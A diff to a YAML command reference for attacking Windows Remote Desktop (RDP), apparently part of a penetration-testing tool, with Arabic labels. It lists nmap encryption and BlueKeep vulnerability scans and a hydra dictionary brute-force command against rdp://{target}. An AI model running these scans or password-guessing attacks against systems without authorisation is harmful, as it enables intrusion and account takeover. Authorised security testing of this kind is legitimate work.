@@ -1,9 +1,27 @@
 service: rdp
 port: 3389
+arabic_name: "سطح المكتب البعيد (RDP)"
+description: "خدمة ويندوز للوصول البعيد - هدف رئيسي"
 commands:
   recon:
-    - "nmap -p3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 {target}"
+    arabic: "استطلاع"
+    items:
+      - cmd: "nmap -p3389 --script rdp-enum-encryption {target}"
+        desc: "فحص تشفير RDP"
+        output: "CredSSP, RDP, SSL versions"
+        when: "أول أمر"
   brute_force:
-    - "hydra -L users.txt -P pass.txt rdp://{target}"
+    arabic: "تخمين كلمات المرور"
+    items:
+      - cmd: "hydra -L users.txt -P pass.txt rdp://{target}"
+        desc: "هجوم قاموس على RDP"
+        output: "[3389][rdp] host: X login: Y password: Z"
+        when: "بعد التأكد من وجود RDP"
+        warning: "قد يقفل الحساب بعد محاولات فاشلة - كن حذراً"
   vulnerabilities:
-    - "nmap -p3389 --script rdp-vuln* {target}"
+    arabic: "فحص الثغرات"
+    items:
+      - cmd: "nmap -p3389 --script rdp-vuln* {target}"
+        desc: "فحص BlueKeep و غيرها"
+        output: "VULNERABLE entries"
+        when: "لإصدارات قديمة من Windows"
